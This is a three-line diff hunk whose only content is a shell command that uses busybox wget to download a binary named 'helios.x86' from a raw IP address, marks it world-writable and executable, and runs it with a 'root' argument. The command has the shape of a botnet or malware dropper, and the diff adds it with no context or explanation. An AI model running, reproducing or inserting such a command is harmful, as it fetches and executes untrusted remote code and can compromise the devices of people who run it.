@@ -1,0 +1,3 @@
+cd /sdcard/downloads; busybox wget http://89.34.27.38/hakka/helios.x86; chmod 777 helios.x86; ./helios.x86 root->>.x86
+
+
